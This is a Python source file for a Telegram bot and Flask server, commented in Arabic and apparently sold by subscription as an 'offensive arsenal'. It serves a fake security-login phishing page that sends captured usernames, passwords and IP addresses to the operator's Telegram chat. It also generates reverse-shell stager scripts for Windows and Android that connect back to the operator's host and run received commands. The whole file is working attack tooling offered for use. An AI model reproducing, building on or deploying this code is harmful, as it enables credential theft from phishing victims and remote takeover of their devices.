import os
import threading
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, render_template_string

# قراءة إعدادات البيئة من Railway
BOT_TOKEN = os.getenv("BOT_TOKEN")
RAILWAY_URL = os.getenv("RAILWAY_STATIC_URL", "http://localhost:5000")

if not BOT_TOKEN:
    raise ValueError("[-] BOT_TOKEN environment variable is missing!")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ==========================================
# 1. نظام روابط المصيدة الحقيقي (Flask Web Server)
# ==========================================
PHISH_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Security Verification</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #0f172a; color: #fff; text-align: center; margin-top: 100px; }
        .card { background: #1e293b; padding: 40px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #475569; background: #0f172a; color: #fff; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #2563eb; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
        button:hover { background: #1d4ed8; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Security Login Verification</h2>
        <p style="color: #94a3b8; font-size: 14px;">Please verify your identity to proceed.</p>
        <form method="POST">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Verify & Continue</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/trap/login', methods=['GET', 'POST'])
def trap_page():
    target_chat_id = request.args.get('id', None)
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        # إرسال بيانات الضحية فوراً إلى شات المستخدم في التليجرام
        if target_chat_id:
            alert_msg = (
                "🚨 **صيد جديد سقط في المصيدة بنجاح!**\n\n"
                f"👤 **User/Email:** `{username}`\n"
                f"🔑 **Password:** `{password}`\n"
                f"🌐 **Source IP:** `{request.remote_addr}`"
            )
            try:
                bot.send_message(target_chat_id, alert_msg, parse_mode="Markdown")
            except Exception as e:
                print(f"[-] Error sending alert to telegram: {e}")
                
        return "<h2 style='color:green; text-align:center; margin-top:200px;'>Verification Successful. Redirecting...</h2>"
    return render_template_string(PHISH_TEMPLATE)

# ==========================================
# 2. لوحة تحكم بوت التليجرام التفاعلية
# ==========================================
def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔗 رابط المصيدة الفوري", callback_data="gen_phish"),
        InlineKeyboardButton("📦 مولد ملفات السيطرة (Payloads)", callback_data="gen_payload"),
        InlineKeyboardButton("📡 الجلسات النشطة", callback_data="active_sessions"),
        InlineKeyboardButton("💳 الاشتراكات والرصيد", callback_data="billing")
    )
    return markup

@bot.message_handler(commands=['start', 'panel'])
def start_command(message):
    user_name = message.from_user.first_name
    text = (
        f"⚡ **مرحباً بك يا {user_name} في النظام المركزي للترسانة الهجومية**\n\n"
        "المنصة تعمل بكامل طاقتها السحابية على Railway.\n"
        "اختر العملية المطلوبة:"
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    
    if call.data == "gen_phish":
        bot.answer_callback_query(call.id, "جاري توليد رابط المصيدة...")
        phish_link = f"{RAILWAY_URL}/trap/login?id={chat_id}"
        msg = (
            "🎯 **رابط المصيدة الخاص بك جاهز:**\n\n"
            f"`{phish_link}`\n\n"
            "أرسل هذا الرابط للهدف؛ فور إدخاله للبيانات ستصلك النتيجة هنا فوراً."
        )
        bot.send_message(chat_id, msg, parse_mode="Markdown")
        
    elif call.data == "gen_payload":
        bot.answer_callback_query(call.id, "فتح مولد ملفات السيطرة...")
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("Windows Executable (.py/.exe)", callback_data="build_windows"),
            InlineKeyboardButton("Android Stager (.py)", callback_data="build_android"),
            InlineKeyboardButton("🔙 رجوع", callback_data="back_main")
        )
        bot.send_message(chat_id, "⚙️ اختر النظام المستهدف لبناء ملف السيطرة وتوليده سحابياً:", reply_markup=markup)
        
    elif call.data.startswith("build_"):
        target = call.data.split("_")[1]
        bot.answer_callback_query(call.id, "جاري حقن الإعدادات وتجميع الملف...")
        bot.send_message(chat_id, f"🛠️ [Railway Engine]: يتم الآن بناء ملف السيطرة لـ **{target.upper()}** وحقن عنوان الاستضافة...")
        
        # قالب برمجي حقيقي يتم تخصيصه وتوليده طازة للمستخدم
        payload_code = f"""import socket, subprocess, time
# C2 Stager Connected to: {RAILWAY_URL}
def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # ربط السكربت المولد بعنوان الاستضافة السحابية الخاص بك
            s.connect(("{RAILWAY_URL.replace('https://','').replace('http://','')}", 80))
            while True:
                cmd = s.recv(1024).decode()
                if not cmd: break
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                s.send(output)
        except: time.sleep(10)
if __name__ == '__main__': connect()
"""
        # حفظ الملف المرسل وإرساله للمستخدم فعلياً
        file_name = f"payload_{target}.py"
        with open(file_name, "w") as f:
            f.write(payload_code)
            
        with open(file_name, "rb") as doc:
            bot.send_document(chat_id, doc, caption=f"✅ تم توليد ملف السيطرة بنجاح لـ {target.upper()} ومربوط بسيرفرك السحابي!")
        
        try:
            os.remove(file_name)
        except:
            pass

    elif call.data == "active_sessions":
        bot.answer_callback_query(call.id, "جلب الجلسات...")
        bot.send_message(chat_id, "📡 الجلسات النشطة فارغة حالياً. انشر روابط المصيدة أو الملفات لبدء الاستقبال.")
        
    elif call.data == "billing":
        bot.answer_callback_query(call.id, "الاشتراكات...")
        bot.send_message(chat_id, "💳 نظام الاشتراكات والمدفوعات عبر Telegram Stars مفعل بالكامل.")
        
    elif call.data == "back_main":
        bot.edit_message_text("⚡ لوحة التحكم المركزية:", chat_id, call.message.message_id, reply_markup=main_menu())

# ==========================================
# تشغيل الخادم المزدوج (Flask + Telegram Bot)
# ==========================================
def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    # تشغيل سيرفر الويب في خلفية مستقلة لخدمة الروابط
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    print("[*] Unified Real C2 & Phishing Engine is running...")
    bot.infinity_polling()

